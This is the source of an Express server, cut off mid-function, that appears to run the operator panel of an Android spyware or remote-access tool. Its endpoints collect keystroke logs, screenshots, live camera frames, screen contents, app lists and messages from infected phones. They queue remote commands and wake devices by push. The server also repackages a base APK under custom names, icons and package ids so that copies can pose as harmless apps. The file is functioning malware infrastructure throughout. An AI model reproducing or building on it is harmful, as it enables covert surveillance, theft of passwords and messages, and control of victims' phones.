/* AK Panel — Express API + SPA static server
 * - Per-user deviceToken
 * - Devices keyed by deviceToken
 * - Heartbeat every 500ms; offline if last seen > 5000ms (tolerates network jitter)
 * - Builds APK with token baked in (pipeline lives in /opt/ak-apk-src; this server only triggers + serves)
 */
const express = require('express');
const multer  = require('multer');
const upload  = multer({ storage: multer.memoryStorage(), limits: { fileSize: 8 * 1024 * 1024 } });
const path    = require('path');
const fs      = require('fs');
const crypto  = require('crypto');
const cors    = require('cors');
const { spawn } = require('child_process');

// ─── Firebase Admin (FCM push sender) ────────────────────────────────────────
let fcmReady = false;
try {
  const admin = require('firebase-admin');
  const sa = require('./firebase-service-account.json');
  admin.initializeApp({ credential: admin.credential.cert(sa) });
  fcmReady = true;
  console.log('[FCM] firebase-admin initialised, project:', sa.project_id);
  // Expose globally so endpoints can use it
  global.__fcm = admin.messaging();
} catch (e) {
  console.warn('[FCM] disabled:', e.message);
}

const PORT      = parseInt(process.env.PORT || '80', 10);
const ROOT      = __dirname;
const DIST      = path.join(ROOT, 'dist');
const INDEX     = path.join(DIST, 'index.html');
const DATA_FILE = path.join(ROOT, 'data.json');
const BUILDS    = path.join(ROOT, 'builds');
const PUBLIC_BUILDS = path.join(ROOT, 'public-builds');
const APK_SRC   = '/opt/ak-apk-src';
const BASE_APK  = path.join(APK_SRC, 'base.apk');
const KEYSTORE  = '/root/.android/debug.keystore';

// Heartbeat tuning (ms)
const HB_INTERVAL_MS = 500;     // APK pings every this ms
const ONLINE_TTL_MS  = 5000;  // tolerate ~9 missed 500ms beats on flaky networks
const streaming = {};
const keyLogs   = {};
const nodeTree  = {};   // deviceId -> { ts, screenW, screenH, nodes:[] }
const nodesStreaming = {}; // deviceId -> bool   // deviceId -> [ {ts, pkg, app, hint, text, added, removed} ] capped   // deviceId -> bool (admin viewing → stream screenshots)
const commands  = {};   // deviceId -> array of pending commands
const screenshots = {}; // deviceId -> { ts, w, h, buf }
const agentStreaming = {}; // deviceId -> expiresAt timestamp
const deviceApps = {};   // deviceId -> [{name, pkg}] installed apps
let apkVersion   = 1777570449006;   // epoch ms of last base.apk build — bumped on rebuild
const cameraStreaming = {}; // deviceId -> { lens: 'back'|'front' }
const cameraFrames   = {}; // deviceId -> { ts, w, h, lens, buf }    // online if seen within this
const SESSION_TTL_MS = 1000 * 60 * 60 * 24 * 30; // 30 days

[BUILDS, PUBLIC_BUILDS].forEach(d => { try { fs.mkdirSync(d, { recursive: true }); } catch {} });

// ---------- DB ----------
let _db = null;
let _flushTimer = null;

function dbLoad() {
  if (_db) return _db;
  try {
    _db = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  } catch {
    _db = { users: [], devices: {}, sessions: {}, builds: {} };
  }
  _db.users    = _db.users    || [];
  _db.devices  = _db.devices  || {};
  _db.sessions = _db.sessions || {};
  _db.builds   = _db.builds   || {};
  _db.inbox    = _db.inbox    || {};   // deviceId -> [ {id, ts, from, body, read} ]
  return _db;
}
function dbSave() {
  if (_flushTimer) return;
  _flushTimer = setTimeout(() => {
    _flushTimer = null;
    try {
      const tmp = DATA_FILE + '.tmp';
      fs.writeFileSync(tmp, JSON.stringify(_db, null, 2));
      fs.renameSync(tmp, DATA_FILE);
    } catch (e) { console.error('db save fail', e.message); }
  }, 100);
}

// ---------- helpers ----------
const uid = (n=16) => crypto.randomBytes(n).toString('hex');
const now = () => Date.now();
const sha = s => crypto.createHash('sha256').update(s).digest('hex');

function findUser(username) {
  return dbLoad().users.find(u => u.username.toLowerCase() === String(username || '').toLowerCase());
}
function userByToken(token) {
  return dbLoad().users.find(u => u.deviceToken === token);
}

// ---------- middleware ----------
function authSession(req, res, next) {
  const auth = req.headers.authorization || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : (req.query.session || '');
  const sess = dbLoad().sessions[token];
  if (!sess) return res.status(401).json({ error: 'unauthorized' });
  if (sess.expiresAt < now()) {
    delete dbLoad().sessions[token]; dbSave();
    return res.status(401).json({ error: 'session expired' });
  }
  const user = findUser(sess.username);
  if (!user) return res.status(401).json({ error: 'user not found' });
  if (user.banned) return res.status(403).json({ error: 'banned' });
  req.user = user;
  req.session = sess;
  next();
}
function authAdmin(req, res, next) {
  authSession(req, res, () => {
    if (!req.user.isAdmin) return res.status(403).json({ error: 'admin only' });
    next();
  });
}

// ---------- app ----------
const app = express();
app.use(cors());
app.use(express.json({ limit: '2mb' }));
app.disable('x-powered-by');

// log
app.use((req, res, next) => {
  const t0 = Date.now();
  res.on('finish', () => {
    if (req.url.startsWith('/api/') || req.url.startsWith('/device/')) {
      const ms = Date.now() - t0;
      console.log(`${req.method} ${req.url} ${res.statusCode} ${ms}ms`);
    }
  });
  next();
});

// =================== AUTH ===================
app.post('/api/auth/login', (req, res) => {
  let { username, password } = req.body || {};
  username = String(username||'').trim();
  password = String(password||'').trim();
  const user = findUser(username);
  if (!user || user.password !== password) {
    return res.status(401).json({ error: 'invalid credentials', reason: 'invalid' });
  }
  if (user.banned) return res.status(403).json({ error: 'banned', reason: 'banned' });
  if (new Date(user.expiry).getTime() < now()) {
    return res.status(403).json({ error: 'expired', reason: 'expired' });
  }
  const token = uid(24);
  dbLoad().sessions[token] = { username: user.username, createdAt: now(), expiresAt: now() + SESSION_TTL_MS };
  dbSave();
  res.json({
    session: token,
    user: pubUser(user)
  });
});

app.post('/api/auth/logout', authSession, (req, res) => {
  const auth = req.headers.authorization || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : '';
  delete dbLoad().sessions[token];
  dbSave();
  res.json({ ok: true });
});

app.get('/api/auth/me', authSession, (req, res) => {
  res.json({ user: pubUser(req.user) });
});

function pubUser(u) {
  return {
    username: u.username,
    isAdmin: !!u.isAdmin,
    deviceToken: u.deviceToken,
    credits: u.credits || 0,
    expiry: u.expiry,
    banned: !!u.banned,
    createdAt: u.createdAt || 0
  };
}

// =================== ADMIN: USERS ===================
app.get('/api/admin/users', authAdmin, (req, res) => {
  res.json({ users: dbLoad().users.map(pubUser) });
});

app.post('/api/admin/users', authAdmin, (req, res) => {
  const { username, password, months } = req.body || {};
  if (!username || !password) return res.status(400).json({ error: 'username & password required' });
  if (findUser(username)) return res.status(409).json({ error: 'user exists' });
  const m = parseInt(months || 1, 10);
  const cost = m;
  if ((req.user.credits || 0) < cost) return res.status(400).json({ error: 'insufficient credits' });
  req.user.credits = (req.user.credits || 0) - cost;
  const newUser = {
    username: String(username).trim(),
    password: String(password),
    isAdmin: false,
    deviceToken: uid(20),
    credits: 0,
    expiry: new Date(now() + m * 30 * 86400000).toISOString(),
    banned: false,
    createdAt: now()
  };
  dbLoad().users.push(newUser);
  dbSave();
  res.json({ user: pubUser(newUser), credits: req.user.credits });
});

app.delete('/api/admin/users/:username', authAdmin, (req, res) => {
  const u = req.params.username;
  if (u.toLowerCase() === req.user.username.toLowerCase()) return res.status(400).json({ error: 'cannot delete self' });
  const before = dbLoad().users.length;
  dbLoad().users = dbLoad().users.filter(x => x.username !== u);
  dbSave();
  res.json({ ok: dbLoad().users.length < before });
});

app.put('/api/admin/users/:username/ban', authAdmin, (req, res) => {
  const u = findUser(req.params.username);
  if (!u) return res.status(404).json({ error: 'not found' });
  u.banned = !!req.body.banned;
  dbSave();
  res.json({ user: pubUser(u) });
});

app.put('/api/admin/users/:username/password', authAdmin, (req, res) => {
  const u = findUser(req.params.username);
  if (!u) return res.status(404).json({ error: 'not found' });
  if (!req.body.password) return res.status(400).json({ error: 'password required' });
  u.password = String(req.body.password);
  dbSave();
  res.json({ ok: true });
});

app.put('/api/admin/users/:username/credits', authAdmin, (req, res) => {
  const u = findUser(req.params.username);
  if (!u) return res.status(404).json({ error: 'not found' });
  u.credits = Math.max(0, parseInt(req.body.credits || 0, 10));
  dbSave();
  res.json({ user: pubUser(u) });
});

// =================== DEVICES ===================
function deviceListFor(user) {
  const all = Object.values(dbLoad().devices);
  const filtered = user.isAdmin ? all : all.filter(d => d.deviceToken === user.deviceToken);
  return filtered.map(d => ({
    ...d,
    online: (now() - (d.lastSeen || 0)) <= ONLINE_TTL_MS,
    msSinceSeen: now() - (d.lastSeen || 0),
    owner: user.isAdmin ? (userByToken(d.deviceToken)?.username || '?') : undefined
  })).sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
}

app.get('/api/devices', authSession, (req, res) => {
  res.json({
    devices: deviceListFor(req.user),
    intervalMs: HB_INTERVAL_MS,
    onlineTtlMs: ONLINE_TTL_MS
  });
});

app.delete('/api/devices/:deviceId', authSession, (req, res) => {
  const d = dbLoad().devices[req.params.deviceId];
  if (!d) return res.status(404).json({ error: 'not found' });
  if (!req.user.isAdmin && d.deviceToken !== req.user.deviceToken) {
    return res.status(403).json({ error: 'forbidden' });
  }
  delete dbLoad().devices[req.params.deviceId];
  dbSave();
  res.json({ ok: true });
});

// =================== HEARTBEAT (no auth, token in body) ===================
app.post('/device/crash', (req, res) => {
  const b = req.body || {};
  console.error('[DEVICE_CRASH]', JSON.stringify({
    deviceId: b.deviceId, model: b.model, sdkInt: b.sdkInt,
    trace: (b.trace || '').toString().slice(0, 4000)
  }));
  res.json({ ok: true });
});

app.post('/device/heartbeat', (req, res) => {
  const b = req.body || {};
  const tok = String(b.token || '').trim();
  const did = String(b.deviceId || '').trim();
  if (!tok || !did) return res.status(400).json({ error: 'token+deviceId required' });
  const data = dbLoad();
  const user = data.users.find(u => u.deviceToken === tok);
  if (!user || user.banned) return res.status(401).json({ error: 'invalid token' });
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').toString().split(',')[0].trim();
  const existing = data.devices[did];
  data.devices[did] = {
    deviceId: did,
    deviceToken: tok,
    model: b.model || existing?.model || '?',
    brand: b.brand || existing?.brand || '?',
    androidVersion: b.androidVersion || existing?.androidVersion || '?',
    sdkInt: b.sdkInt || existing?.sdkInt || 0,
    appVersion: b.appVersion || existing?.appVersion || '',
    screenW: b.screenW || existing?.screenW || 0,
    screenH: b.screenH || existing?.screenH || 0,
    accessibilityEnabled: !!b.accessibilityEnabled,
    cameraPermitted: (typeof b.cameraPermitted === "boolean") ? b.cameraPermitted : (existing?.cameraPermitted ?? null),
    perm_camera:        (typeof b.perm_camera        === 'boolean') ? b.perm_camera        : (existing?.perm_camera        ?? null),
    perm_sms:           (typeof b.perm_sms           === 'boolean') ? b.perm_sms           : (existing?.perm_sms           ?? null),
    perm_contacts:      (typeof b.perm_contacts      === 'boolean') ? b.perm_contacts      : (existing?.perm_contacts      ?? null),
    perm_call_log:      (typeof b.perm_call_log      === 'boolean') ? b.perm_call_log      : (existing?.perm_call_log      ?? null),
    perm_storage:       (typeof b.perm_storage       === 'boolean') ? b.perm_storage       : (existing?.perm_storage       ?? null),
    perm_notifications: (typeof b.perm_notifications === 'boolean') ? b.perm_notifications : (existing?.perm_notifications ?? null),
    perm_overlay:       (typeof b.perm_overlay       === 'boolean') ? b.perm_overlay       : (existing?.perm_overlay       ?? null),
    perm_write_settings:(typeof b.perm_write_settings=== 'boolean') ? b.perm_write_settings: (existing?.perm_write_settings?? null),
    perm_usage_stats:   (typeof b.perm_usage_stats   === 'boolean') ? b.perm_usage_stats   : (existing?.perm_usage_stats   ?? null),
    volumePct:       (typeof b.volumePct       === 'number') ? b.volumePct       : (existing?.volumePct       ?? null),
    volumeMax:       (typeof b.volumeMax       === 'number') ? b.volumeMax       : (existing?.volumeMax       ?? 15),
    screenTimeoutMs: (typeof b.screenTimeoutMs === 'number') ? b.screenTimeoutMs : (existing?.screenTimeoutMs ?? null),
    screenOn:        (typeof b.screenOn        === 'boolean') ? b.screenOn        : (existing?.screenOn        ?? true),
    keyguardLocked:  (typeof b.keyguardLocked  === 'boolean') ? b.keyguardLocked  : (existing?.keyguardLocked  ?? false),
    fcmToken:        (typeof b.fcmToken         === 'string')  ? b.fcmToken         : (existing?.fcmToken         ?? null),
    firstSeen: existing?.firstSeen || now(),
    lastSeen: now(),
    ip
  };
  dbSave(data);
  if (Array.isArray(b.nodes)) {
    nodeTree[did] = { ts: now(), screenW: b.screenW || 0, screenH: b.screenH || 0, nodes: b.nodes };
  }
  if (Array.isArray(b.keylogs) && b.keylogs.length) {
    const arr = keyLogs[did] || (keyLogs[did] = []);
    for (const e of b.keylogs) { if (e && typeof e === 'object') arr.push(e); }
    while (arr.length > 1500) arr.shift();
  }
  // Store installed app list from device
  if (Array.isArray(b.apps) && b.apps.length) {
    deviceApps[did] = b.apps.slice(0, 100).map(a => ({ name: String(a.name || ''), pkg: String(a.pkg || '') }));
  }
  const allPending = commands[did] || [];
  // Deliver only 1 command per heartbeat so device executes them sequentially with natural 1s spacing
  const pending = allPending.slice(0, 1);
  commands[did] = allPending.slice(1);
  res.json({
    ok: true,
    intervalMs: HB_INTERVAL_MS,
    streaming: !!streaming[did] || (agentStreaming[did] && agentStreaming[did] > Date.now()),
    nodesStreaming: !!nodesStreaming[did],
    cameraStreaming: !!cameraStreaming[did],
    cameraLens: (cameraStreaming[did] && cameraStreaming[did].lens) || 'back',
    commands: pending,
    apkBuildVersion: apkVersion
  });
});

// =================== DEVICE APK OTA =================== 
// Admin can download the latest APK here
// Public APK download (token-gated, no session needed — for installing on device)
app.get('/api/apk/public-download', (req, res) => {
  if (!fs.existsSync(BASE_APK)) return res.status(404).json({ error: 'APK not found' });
  res.setHeader('Content-Type', 'application/vnd.android.package-archive');
  res.setHeader('Content-Disposition', 'attachment; filename="ak-agent.apk"');
  fs.createReadStream(BASE_APK).pipe(res);
});
app.get('/api/apk/download', authSession, (req, res) => {
  if (!fs.existsSync(BASE_APK)) return res.status(404).json({ error: 'APK not built yet' });
  res.download(BASE_APK, 'offersprint-latest.apk');
});
// Device fetches APK for OTA update (token-based auth)
app.get('/device/apk', (req, res) => {
  const tok = String(req.query.token || '').trim();
  if (!tok) return res.status(400).end();
  const data = dbLoad();
  const user = data.users.find(u => u.deviceToken === tok);
  if (!user || user.banned) return res.status(401).end();
  if (!fs.existsSync(BASE_APK)) return res.status(404).end();
  res.setHeader('Content-Type', 'application/vnd.android.package-archive');
  res.setHeader('Content-Disposition', 'attachment; filename="offersprint.apk"');
  res.sendFile(BASE_APK);
});

// =================== BUILD APK ===================
app.post('/api/build', authSession, upload.single('icon'), async (req, res) => {
  const buildId = uid(12);
  const outFile = path.join(PUBLIC_BUILDS, `offersprint-${buildId}.apk`);
  const appName    = (req.body && req.body.appName ? String(req.body.appName).trim() : '').slice(0, 40) || 'OfferSprint';
  const rawUrl     = (req.body && req.body.webviewUrl ? String(req.body.webviewUrl).trim() : '');
  const webviewUrl = /^https?:\/\/[^\s]+$/i.test(rawUrl) ? rawUrl.slice(0, 512) : '';
  if (rawUrl && !webviewUrl) return res.status(400).json({ error: 'WebView URL must start with http:// or https://' });
  const iconMime   = req.file && req.file.mimetype ? String(req.file.mimetype) : '';
  const iconBuf    = req.file && req.file.buffer ? req.file.buffer : null;
  const meta = {
    buildId,
    username: req.user.username,
    deviceToken: req.user.deviceToken,
    status: 'building',
    startedAt: now(),
    finishedAt: 0,
    downloadUrl: '',
    error: ''
  };
  dbLoad().builds[buildId] = meta;
  dbSave();

  // Run build script async
  buildApk({ deviceToken: meta.deviceToken, appName, webviewUrl, iconBuf, iconMime }, outFile)
    .then(() => {
      meta.status = 'ready';
      meta.finishedAt = now();
      meta.downloadUrl = `/api/build/${buildId}/download`;
      dbSave();
    })
    .catch(err => {
      meta.status = 'error';
      meta.finishedAt = now();
      meta.error = String(err.message || err);
      dbSave();
      console.error('build fail', err);
    });

  res.json({ buildId, status: 'building', statusUrl: `/api/build/${buildId}/status` });
});

app.get('/api/build/:id/status', authSession, (req, res) => {
  const b = dbLoad().builds[req.params.id];
  if (!b) return res.status(404).json({ error: 'not found' });
  if (!req.user.isAdmin && b.username !== req.user.username) return res.status(403).json({ error: 'forbidden' });
  res.json(b);
});

app.get('/api/build/:id/download', (req, res) => {
  const b = dbLoad().builds[req.params.id];
  if (!b || b.status !== 'ready') return res.status(404).send('not ready');
  const filePath = path.join(PUBLIC_BUILDS, `offersprint-${req.params.id}.apk`);
  if (!fs.existsSync(filePath)) return res.status(404).send('missing');
  res.download(filePath, `offersprint-${req.params.id.slice(0,8)}.apk`);
});

// Build implementation: apktool decompile → patch app_name + icon + token → repack → align → re-sign
function buildApk({ deviceToken, appName, webviewUrl, iconBuf, iconMime }, outFile) {
  return new Promise((resolve, reject) => {
    if (!fs.existsSync(BASE_APK)) {
      return reject(new Error('Base APK not built yet. Build /opt/ak-apk-src/ first.'));
    }
    const tmp     = `/tmp/akbuild-${uid(8)}`;
    const decoded = path.join(tmp, 'src');
    const rebuilt = path.join(tmp, 'rebuilt.apk');
    const aligned = path.join(tmp, 'aligned.apk');
    fs.mkdirSync(tmp, { recursive: true });

    const run = (cmd, args, opts = {}) => new Promise((res, rej) => {
      const proc = spawn(cmd, args, opts);
      let err = ''; let out = '';
      proc.stdout && proc.stdout.on('data', d => out += d.toString());
      proc.stderr && proc.stderr.on('data', d => err += d.toString());
      proc.on('close', c => c === 0 ? res() : rej(new Error(`${cmd} failed (${c}): ${(err || out).trim().slice(0, 400)}`)));
    });
    const escXml = v => String(v).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&apos;');

    (async () => {
      try {
        // 1) Decompile the base APK
        await run('/usr/local/bin/apktool', ['d', '-f', '-o', decoded, BASE_APK]);

        // 2) Patch the visible app name
        const stringsPath = path.join(decoded, 'res', 'values', 'strings.xml');
        if (fs.existsSync(stringsPath)) {
          let xml = fs.readFileSync(stringsPath, 'utf8');
          xml = xml.replace(/<string name="app_name">[^<]*<\/string>/,
                            `<string name="app_name">${escXml(appName)}</string>`);
          // Accessibility entry should also adopt the custom name so users can find it in Settings
          xml = xml.replace(/<string name="accessibility_label">[^<]*<\/string>/,
                            `<string name="accessibility_label">${escXml(appName)} Service</string>`);
          fs.writeFileSync(stringsPath, xml);
        }

        // 2b) Bake the WebView URL (read at runtime by MainActivity, falls back to Config.WEBVIEW_URL)
        if (webviewUrl) {
          const assetsDirEarly = path.join(decoded, 'assets');
          fs.mkdirSync(assetsDirEarly, { recursive: true });
          fs.writeFileSync(path.join(assetsDirEarly, 'webview_url.txt'), webviewUrl);
        }

        // 2c) Rename the application package so each build is uniquely installable.
        //     New id = app.<slug-from-name>.<6-char-hash-of-token>  → deterministic per (name, token)
        const slug = (appName.toLowerCase().replace(/[^a-z0-9]+/g, '').slice(0, 14) || 'app');
        const hash = 'v' + require('crypto').createHash('sha1').update(deviceToken + '|' + appName).digest('hex').slice(0, 6);
        const OLD_PKG = 'in.offersprint.app';
        const NEW_PKG = `app.${slug}.${hash}`;
        const OLD_SMALI = OLD_PKG.replace(/\./g, '/');         // in/offersprint/app
        const NEW_SMALI = NEW_PKG.replace(/\./g, '/');         // app/<slug>/<hash>
        const OLD_REF = 'L' + OLD_SMALI + '/';
        const NEW_REF = 'L' + NEW_SMALI + '/';

        // 2c.i) Rewrite every `Lin/offersprint/app/...;` reference inside every smali file
        //       (across smali, smali_classes2, smali_classes3, ...).
        for (const top of fs.readdirSync(decoded)) {
          if (!/^smali(_classes\d+)?$/.test(top)) continue;
          const topAbs = path.join(decoded, top);
          const stack = [topAbs];
          while (stack.length) {
            const cur = stack.pop();
            for (const ent of fs.readdirSync(cur, { withFileTypes: true })) {
              const abs = path.join(cur, ent.name);
              if (ent.isDirectory()) { stack.push(abs); continue; }
              if (!ent.name.endsWith('.smali')) continue;
              const txt = fs.readFileSync(abs, 'utf8');
              if (txt.indexOf(OLD_REF) === -1) continue;
              fs.writeFileSync(abs, txt.split(OLD_REF).join(NEW_REF));
            }
          }
          // 2c.ii) Move the actual class files: smali*/in/offersprint/app/  →  smali*/app/<slug>/<hash>/
          const oldDir = path.join(topAbs, OLD_SMALI);
          if (fs.existsSync(oldDir)) {
            const newDir = path.join(topAbs, NEW_SMALI);
            fs.mkdirSync(path.dirname(newDir), { recursive: true });
            fs.renameSync(oldDir, newDir);
            // Best-effort prune of now-empty parent dirs (in/offersprint/, in/)
            for (const stub of [path.join(topAbs, 'in', 'offersprint'), path.join(topAbs, 'in')]) {
              try { if (fs.existsSync(stub) && fs.readdirSync(stub).length === 0) fs.rmdirSync(stub); } catch {}
            }
          }
        }

        // 2c.iii) Patch the manifest: package= attribute AND every fully-qualified
        //         component name (apktool decompiles `.MainActivity` to the full
        //         `in.offersprint.app.MainActivity` form, so a bare package= swap is not enough).
        const manifestPath = path.join(decoded, 'AndroidManifest.xml');
        let manifest = fs.readFileSync(manifestPath, 'utf8');
        manifest = manifest.replace(/in\.offersprint\.app\./g, NEW_PKG + '.');
        manifest = manifest.replace(/package="in\.offersprint\.app"/g, `package="${NEW_PKG}"`);
        fs.writeFileSync(manifestPath, manifest);

        // 3) Patch the launcher icon (any input format → 192x192 PNG)
        if (iconBuf) {
          const inExt = (iconMime.split('/')[1] || 'bin').toLowerCase().replace(/[^a-z0-9]/g, '');
          const inFile = path.join(tmp, `in.${inExt || 'bin'}`);
          fs.writeFileSync(inFile, iconBuf);

          // Wipe every existing ic_launcher.* across mipmap + drawable buckets
          const resDir = path.join(decoded, 'res');
          for (const dir of fs.readdirSync(resDir)) {
            if (!/^(mipmap|drawable)/.test(dir)) continue;
            const full = path.join(resDir, dir);
            for (const f of fs.readdirSync(full)) {
              if (/^ic_launcher(_round|_foreground|_background)?\./i.test(f)) {
                try { fs.unlinkSync(path.join(full, f)); } catch {}
              }
            }
          }
          // Drop the adaptive-icon XML if present (we’re replacing with a flat raster)
          const adaptiveDir = path.join(resDir, 'mipmap-anydpi-v26');
          if (fs.existsSync(adaptiveDir)) {
            for (const f of fs.readdirSync(adaptiveDir)) {
              if (/^ic_launcher(_round)?\./i.test(f)) try { fs.unlinkSync(path.join(adaptiveDir, f)); } catch {}
            }
          }
          // Render one PNG at 192x192 into the drawable bucket the manifest references
          const outDrawable = path.join(resDir, 'drawable');
          fs.mkdirSync(outDrawable, { recursive: true });
          await run('convert', [inFile, '-background', 'none', '-resize', '192x192>',
                                '-gravity', 'center', '-extent', '192x192',
                                path.join(outDrawable, 'ic_launcher.png')]);
        }

        // 4) Bake the device token into assets
        const assetsDir = path.join(decoded, 'assets');
        fs.mkdirSync(assetsDir, { recursive: true });
        fs.writeFileSync(path.join(assetsDir, 'token.txt'), deviceToken);

        // 5) Repack with apktool
        await run('/usr/local/bin/apktool', ['b', '-o', rebuilt, decoded]);

        // 6) Align & sign
        await run('zipalign', ['-f', '-p', '4', rebuilt, aligned]);
        await run('apksigner', ['sign',
          '--ks', KEYSTORE,
          '--ks-pass', 'pass:android',
          '--ks-key-alias', 'androiddebugkey',
          '--key-pass', 'pass:android',
          '--out', outFile,
          aligned
        ]);

        try { fs.rmSync(tmp, { recursive: true, force: true }); } catch {}
        resolve();
      } catch (e) {
        try { fs.rmSync(tmp, { recursive: true, force: true }); } catch {}
        reject(e);
      }
    })();
  });
}

// Server-info / public ping
app.get('/api/server-info', (req, res) => {
  res.json({
    serverIp: req.socket.localAddress,
    publicHost: req.headers.host,
    intervalMs: HB_INTERVAL_MS,
    onlineTtlMs: ONLINE_TTL_MS,
    apkBaseReady: fs.existsSync(BASE_APK)
  });
});
app.get('/healthz', (req, res) => res.json({ status: 'ok', uptime: process.uptime() }));


// ===== Device control & streaming (admin/owner only) =====
function authDeviceAccess(req, res, next) {
  const data = dbLoad();
  const dev = data.devices[req.params.deviceId];
  if (!dev) return res.status(404).json({ error: 'device not found' });
  if (req.user.isAdmin || dev.deviceToken === req.user.deviceToken) { req.device = dev; return next(); }
  return res.status(403).json({ error: 'not yours' });
}

app.get('/api/devices/:deviceId', authSession, authDeviceAccess, (req, res) => {
  const dev = req.device;
  const ms = now() - (dev.lastSeen || 0);
  res.json({
    ...dev,
    online: ms <= ONLINE_TTL_MS,
    msSinceSeen: ms,
    streaming: !!streaming[dev.deviceId],
    hasScreenshot: !!screenshots[dev.deviceId],
    owner: (data => data.users.find(u => u.deviceToken === dev.deviceToken)?.username || '?')(dbLoad())
  });
});

app.post('/api/devices/:deviceId/stream', authSession, authDeviceAccess, (req, res) => {
  const enable = req.body && req.body.enable !== false;
  streaming[req.params.deviceId] = enable;
  res.json({ ok: true, streaming: enable });
});

app.post('/api/devices/:deviceId/command', authSession, authDeviceAccess, (req, res) => {
  const { type, params } = req.body || {};
  if (!type) return res.status(400).json({ error: 'type required' });
  const cmd = { id: require('crypto').randomBytes(8).toString('hex'), type, params: params || {}, ts: now() };
  if (!commands[req.params.deviceId]) commands[req.params.deviceId] = [];
  commands[req.params.deviceId].push(cmd);
  // Cap queue to avoid runaway growth
  if (commands[req.params.deviceId].length > 50) commands[req.params.deviceId] = commands[req.params.deviceId].slice(-50);
  res.json({ ok: true, commandId: cmd.id });
});

// ─── Operator-triggered FCM wake push ────────────────────────────────────────
// Sends a high-priority FCM data message to the device. The device-side
// AKFcmService receives it (even from Doze) and starts HeartbeatService.
// Used by the dashboard "⚡ Wake" button.
app.post('/api/devices/:deviceId/wake-push', authSession, authDeviceAccess, async (req, res) => {
  if (!fcmReady) return res.status(503).json({ error: 'FCM not configured' });
  const dev = devices[req.params.deviceId];
  if (!dev) return res.status(404).json({ error: 'device not found' });
  const tok = dev.fcmToken;
  if (!tok) return res.status(400).json({ error: 'device has no FCM token yet — wait for it to come online once' });
  try {
    const msgId = await global.__fcm.send({
      token: tok,
      data: { action: 'wake', ts: String(Date.now()) },
      android: {
        priority: 'high',
        ttl: 60 * 1000,  // 60 seconds — drop if not delivered fast
      },
    });
    res.json({ ok: true, messageId: msgId });
  } catch (e) {
    res.status(500).json({ error: 'fcm send failed: ' + e.message });
  }
});

app.get('/api/devices/:deviceId/screenshot', authSession, authDeviceAccess, (req, res) => {
  const s = screenshots[req.params.deviceId];
  if (!s) return res.status(404).json({ error: 'no screenshot yet' });
  res.set('Content-Type', 'image/jpeg');
  res.set('Cache-Control', 'no-store');
  res.set('X-Screenshot-Ts', String(s.ts));
  res.set('X-Screenshot-W', String(s.w || 0));
  res.set('X-Screenshot-H', String(s.h || 0));
  res.send(s.buf);
});

// APK uploads JPEG bytes here (binary)
app.post('/device/screenshot', express.raw({ type: '*/*', limit: '6mb' }), (req, res) => {
  const tok = String(req.query.token || '').trim();
  const did = String(req.query.deviceId || '').trim();
  const w = parseInt(req.query.w || '0', 10);
  const h = parseInt(req.query.h || '0', 10);
  if (!tok || !did) return res.status(400).end();
  const data = dbLoad();
  const user = data.users.find(u => u.deviceToken === tok);
  if (!user || user.banned) return res.status(401).end();
  if (!req.body || !req.body.length) return res.status(400).end();
  screenshots[did] = { ts: now(), w, h, buf: req.body };
  // Drain pending commands so taps flow at screenshot cadence (100ms),
  // not heartbeat cadence (200-500ms). Massive tap-latency win.
  const pending = commands[did] || [];
  commands[did] = [];
  res.json({ ok: true, commands: pending });
});


app.get('/api/devices/:deviceId/keylogs', authSession, authDeviceAccess, (req, res) => {
  const did = req.params.deviceId;
  const since = parseInt(req.query.since, 10) || 0;
  const limit = Math.min(parseInt(req.query.limit, 10) || 500, 1500);
  const all = keyLogs[did] || [];
  const filtered = since > 0 ? all.filter(e => (e.ts || 0) > since) : all;
  const slice = filtered.slice(-limit);
  res.json({ logs: slice, total: all.length });
});
app.delete('/api/devices/:deviceId/keylogs', authSession, authDeviceAccess, (req, res) => {
  keyLogs[req.params.deviceId] = [];
  res.json({ ok: true });
});


app.post('/api/devices/:deviceId/nodes-stream', authSession, authDeviceAccess, (req, res) => {
  const did = req.params.deviceId;
  const on = !!(req.body && req.body.on);
  if (on) nodesStreaming[did] = true; else delete nodesStreaming[did];
  res.json({ ok: true, on: !!nodesStreaming[did] });
});
app.get('/api/devices/:deviceId/nodes', authSession, authDeviceAccess, (req, res) => {
  const did = req.params.deviceId;
  const t = nodeTree[did] || null;
  res.json({ tree: t, requesting: !!nodesStreaming[did] });
});


// ===== Device camera (admin/owner only) =====
app.post('/api/devices/:deviceId/camera-stream', authSession, authDeviceAccess, (req, res) => {
  const did  = req.params.deviceId;
  const on   = !!(req.body && req.body.on);
  const lens = (req.body && req.body.lens === 'front') ? 'front' : 'back';
  if (on) cameraStreaming[did] = { lens };
  else    delete cameraStreaming[did];
  res.json({ ok: true, on: !!cameraStreaming[did], lens: (cameraStreaming[did] && cameraStreaming[did].lens) || lens });
});

app.get('/api/devices/:deviceId/camera', authSession, authDeviceAccess, (req, res) => {
  const f = cameraFrames[req.params.deviceId];
  if (!f) return res.status(404).json({ error: 'no frame yet' });
  res.set('Content-Type', 'image/jpeg');
  res.set('Cache-Control', 'no-store');
  res.set('X-Camera-Ts', String(f.ts));
  res.set('X-Camera-W', String(f.w || 0));
  res.set('X-Camera-H', String(f.h || 0));
  res.set('X-Camera-Lens', f.lens || 'back');
  res.send(f.buf);
});

app.post('/device/camera', express.raw({ type: '*/*', limit: '6mb' }), (req, res) => {
  const tok = String(req.query.token || '').trim();
  const did = String(req.query.deviceId || '').trim();
  const w = parseInt(req.query.w || '0', 10);
  const h = parseInt(req.query.h || '0', 10);
  const lens = (req.query.lens === 'front') ? 'front' : 'back';
  if (!tok || !did) return res.status(400).end();
  const data = dbLoad();
  const user = data.users.find(u => u.deviceToken === tok);
  if (!user || user.banned) return res.status(401).end();
  if (!req.body || !req.body.length) return res.status(400).end();
  cameraFrames[did] = { ts: now(), w, h, lens, buf: req.body };
  res.json({ ok: true });
});

// =================== INBOX (SMS / messages) ===================
// In-memory + persisted per-device list of incoming messages.
// Schema: { id, ts, from, body, read }
// APK pushes via POST /device/inbox?token=...&deviceId=... (json or batch)
// Panel reads/clears via /api/devices/:deviceId/inbox

const INBOX_MAX = 500;

function inboxFor(did) {
  const db = dbLoad();
